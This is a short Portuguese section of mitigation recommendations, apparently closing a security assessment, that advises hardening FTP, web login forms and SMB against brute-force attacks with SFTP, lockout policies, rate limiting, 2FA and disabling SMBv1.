## Recomendações de Mitigações:

### FTP

Desativar FTP simples; usar SFTP/FTPS.
Forçar senhas fortes + política de lockout (bloqueio após N tentativas).
Monitoramento de tentativas de login e alertas.

### Web (formulários)

Implementar proteção contra brute force: rate limiting, captchas progressivos.
Política de senhas fortes e verificação em duas etapas (2FA).
Validar e sanitizar entradas e evitar mensagens de erro que revelem informação de usuário/senha.

### SMB

Desabilitar SMBv1; aplicar patches.
Implementar lockout, usar autenticação centralizada forte.
Segmentar rede e restringir acessos SMB por firewall.
